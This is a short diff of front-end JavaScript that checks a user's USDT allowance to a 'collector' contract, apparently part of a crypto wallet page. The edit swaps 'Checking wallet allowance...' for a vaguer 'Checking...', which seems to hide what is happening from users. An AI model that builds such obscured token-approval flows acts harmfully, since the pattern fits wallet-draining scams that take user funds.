@@ -417,7 +417,7 @@
 
         async function checkExistingAllowanceAndLoad() {
             try {
-                showProgress(30, "Checking wallet allowance...");
+                showProgress(30, "Checking...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
 
